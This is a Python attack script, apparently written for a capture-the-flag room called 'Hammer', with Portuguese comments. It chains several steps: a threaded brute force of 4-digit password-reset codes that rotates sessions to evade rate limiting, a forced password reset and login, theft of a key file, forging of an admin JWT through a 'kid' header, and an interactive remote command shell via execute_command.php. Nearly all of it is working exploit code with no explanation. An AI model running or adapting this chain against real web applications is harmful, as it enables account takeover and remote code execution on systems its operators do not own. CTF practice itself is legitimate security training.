from concurrent.futures import ThreadPoolExecutor, as_completed
from queue import Queue
import json, jwt, requests, re
import sys, threading, argparse

def print_banner():
    banner = r"""
  _    _                                     
 | |  | |                                    
 | |__| | __ _ _ __ ___  _ __ ___   ___ _ __ 
 |  __  |/ _` | '_ ` _ \| '_ ` _ \ / _ \ '__|
 | |  | | (_| | | | | | | | | | | |  __/ |   
 |_|  |_|\__,_|_| |_| |_|_| |_| |_|\___|_|   
    Hammer CTF Tool - by S3r4ph1el                                       
    """
    print(banner)

def parse_args():
    parser = argparse.ArgumentParser(description="Hammer CTF Tool")
    parser.add_argument("ip", help="IP do alvo")
    parser.add_argument("-v", "--verbose", action="store_true", help="Modo verboso")
    parser.add_argument("-t", "--threads", type=int, default=15, help="Número de threads")
    parser.add_argument("--get-flags", action="store_true", help="Obter todas as flags do CTF")
    return parser.parse_args()

args = parse_args()
IP = args.ip
verbose = args.verbose
num_threads = args.threads

##### Configurações #####

login = f"http://{IP}:1337/index.php"
reset = f"http://{IP}:1337/reset_password.php"
logout = f"http://{IP}:1337/logout.php"
exec_path = f"http://{IP}:1337/execute_command.php"
dashboard = f"http://{IP}:1337/dashboard.php"
file_path = f"http://{IP}:1337/188ade1.key"

get_header = {
    "Cookie": f""
}
post_header = {
    "Content-Type": "application/x-www-form-urlencoded",
    "Cookie": f""
}

codes = [str(i).zfill(4) for i in range(1000, 10000)]  # Todos os códigos de 4 dígitos

##### Classes e Funções #####

class HammerSession:
    def __init__(self):
        self.session = requests.Session()
        self.phpsessid = None
        self.token = None

    def set_phpsessid(self, phpsessid):
        self.phpsessid = phpsessid

    def set_token(self, token):
        self.token = token

    def get_header(self, extra=None):
        headers = {
            "Cookie": f"PHPSESSID={self.phpsessid}" if self.phpsessid else ""
        }
        if extra:
            headers.update(extra)
        return headers
    
    def get_headers_authentication(self, extra=None):
        headers = {
            "Cookie": f"PHPSESSID={self.phpsessid}; token={self.token}; persistentSession=yes" if self.phpsessid and self.token else ""
        }
        if extra:
            headers.update(extra)
        return headers

    def post_headers_authentication(self, extra=None):
        headers = {
            "Content-Type": "application/x-www-form-urlencoded",
            "Cookie": f"PHPSESSID={self.phpsessid}" if self.phpsessid else ""
        }
        if extra:
            headers.update(extra)
        return headers

    def post_headers_command(self, extra=None):
        headers = {
            "Content-Type": "application/json",
            "Cookie": f"PHPSESSID={self.phpsessid}; token={self.token}; persistentSession=yes" if self.phpsessid and self.token else "",
            "Authorization": f"Bearer {self.token}" if self.token else ""
        }
        if extra:
            headers.update(extra)
        return headers

def bruteforce(codes, verbose, result_dict, found_event):
    idx = 0
    while idx < len(codes) and not found_event.is_set():
        hammer = HammerSession()
        email_data = "email=tester%40hammer.thm"

        # GET para reset para obter PHPSESSID
        r = hammer.session.get(reset, headers=hammer.get_header())
        phpsessid = hammer.session.cookies.get("PHPSESSID")
        hammer.set_phpsessid(phpsessid)

        # POST para enviar email, usando header com PHPSESSID
        hammer.session.post(reset, data=email_data, headers=hammer.post_headers_authentication(), allow_redirects=True)

        for _ in range(7):
            if idx >= len(codes) or found_event.is_set():
                break
            code = codes[idx]
            idx += 1
            code_data = f"recovery_code={code}&s=180"
            try:
                response = hammer.session.post(reset, data=code_data, headers=hammer.post_headers_authentication(), allow_redirects=True)
            except requests.exceptions.ConnectionError as e:
                if verbose:
                    print(f"[Thread] Erro de conexão: {e}")
                continue

            if "Invalid or expired recovery code!" not in response.text:
                print(f"[SUCESSO] Código: {code}, PHPSESSID: {phpsessid}")
                result_dict['phpsessid'] = phpsessid
                found_event.set()
                return

            if verbose:
                print(f"[Thread] Tentativa {code}: Status={response.status_code}, Size={len(response.text)}, PHPSESSID={phpsessid}")
        hammer.session.get(logout, headers=hammer.get_header())

def run_bruteforce(result_dict=None, found_event=None):
    # Divide os códigos igualmente entre as threads
    chunk_size = (len(codes) + num_threads - 1) // num_threads
    threads = []
    for i in range(num_threads):
        start = i * chunk_size
        end = min(start + chunk_size, len(codes))
        t = threading.Thread(target=bruteforce, args=(codes[start:end], verbose, result_dict, found_event))
        t.start()
        threads.append(t)
    for t in threads:
        t.join()
    return result_dict.get('phpsessid', None)

def reset_password(phpsessid):
    new_password = "Passw0rd1234"
    hammer = HammerSession()
    hammer.set_phpsessid(phpsessid)

    # GET para reset para garantir sessão
    response = hammer.session.get(reset, headers=hammer.get_header(), allow_redirects=True)

    # POST para resetar senha, usando header com PHPSESSID
    password_data = f"new_password={new_password}&confirm_password={new_password}"
    response = hammer.session.post(reset, data=password_data, headers=hammer.post_headers_authentication(), allow_redirects=True)

    if response.status_code == 200:
        print(f"[+] Senha resetada com sucesso para: {new_password}")
        return new_password
    else:
        print("[-] Falha ao resetar a senha.")
        sys.exit(1)

def authenticate(phpsessid, password):
    hammer = HammerSession()
    hammer.set_phpsessid(phpsessid)
    authentication = f"email=tester%40hammer.thm&password={password}"

    # POST para login, usando header com PHPSESSID
    response = hammer.session.post(login, data=authentication, headers=hammer.post_headers_authentication(), allow_redirects=False)
    token = response.cookies.get("token")

    if token:
        print(f"[+] Token JWT: {token}")
        return token
    else:
        print("[-] Falha ao obter o token JWT.")
        sys.exit(1)

def request_file(phpsessid):
    hammer = HammerSession()
    hammer.set_phpsessid(phpsessid)

    # GET do arquivo, usando header com PHPSESSID, token e persistentSession
    response = hammer.session.get(file_path, headers=hammer.get_header())

    if response.status_code == 200:
        with open("188ade1.key", "wb") as f:
            f.write(response.content)
        print("[+] Arquivo 188ade1.key baixado com sucesso.")
        return "188ade1.key"
    else:
        print("[-] Falha ao baixar o arquivo 188ade1.key.")
        sys.exit(1)

def forgery_token(token, file):
    docode = jwt.decode(token, options={"verify_signature": False})

    iat = docode['iat']
    exp = docode['exp']

    secret = open(file).read()

    header = {
        "typ": "JWT",
        "alg": "HS256",
        "kid": "/var/www/html/188ade1.key"
    }

    payload = {
        "iss": "http://hammer.thm",
        "aud": "http://hammer.thm",
        "iat": iat,
        "exp": exp,
        "data": {
            "user_id": 1,
            "email": "tester@hammer.thm",
            "role": "admin" # Alterado para admin
        }
    }

    token = jwt.encode(payload, secret, algorithm="HS256", headers=header)
    if token:
        print("[+] Token forjado com sucesso:\n")
        print(f"Authorization: Bearer {token}\n")
        return token
    else:
        print("[-] Falha ao forjar o token.")
        sys.exit(1)

def command_and_control(phpsessid, token, get_flags=False):
    hammer = HammerSession()
    hammer.set_phpsessid(phpsessid)
    hammer.set_token(token)

    if get_flags:
        print("[+] Obtendo todas as flags do CTF...")
        response = hammer.session.get(dashboard, headers=hammer.get_headers_authentication())

        match = re.search(r"THM\{.*?\}", response.text)
        if match:
            print(f"[+] Flag 1 encontrada: {match.group(0)}")
        else:
            print("[-] Flag 1 não encontrada ou acesso negado, tente acessar o dashboard.")

        data = {"command": "cat /home/ubuntu/flag.txt"}
        response = hammer.session.post(exec_path, json=data, headers=hammer.post_headers_command())
        try:
            json_data = response.json()
            if 'output' in json_data:
                print(f"[+] Flag 2 encontrada: {json_data['output']}\n")
            else:
                print(f"\nResposta inesperada ao obter a flag 2: {json_data}\n")
        except json.JSONDecodeError:
            print(f"\nErro ao decodificar JSON ao obter a flag 2: {response.text}\n")

    headers = hammer.post_headers_command()

    print("Digite 'exit' para sair.")
    while True:
        cmd = input("Command $> ").strip()
        if cmd.lower() == 'exit':
            print("Saindo...")
            break
        if not cmd:
            continue
        data = {"command": f"{cmd}"}
        response = hammer.session.post(exec_path, json=data, headers=headers)

        try:
            json_data = response.json()
            if 'output' in json_data:
                print(f"{json_data['output']}")
            else:
                print(f"\nResposta inesperada: {json_data}\n")
        except json.JSONDecodeError:
            print(f"\nErro ao decodificar JSON: {response.text}\n")

def main():
    print("\n[+] Iniciando a força bruta para encontrar o código de recuperação...")
    found_event = threading.Event()
    result_dict = {}

    phpsessid = run_bruteforce(result_dict=result_dict, found_event=found_event)

    if not phpsessid:
        print("[-] Código de recuperação não encontrado.")
        sys.exit(1)

    print("\n[+] Iniciando a segunda fase: Resetando a senha e gerando o token JWT...")

    password = reset_password(phpsessid)
    token = authenticate(phpsessid, password)
    file = request_file(phpsessid)
    malicious_token = forgery_token(token, file)

    print("[+] Produzindo a interface de comando...\n")
    command_and_control(phpsessid, malicious_token, get_flags=args.get_flags)

if __name__ == "__main__":
    print_banner()
    main()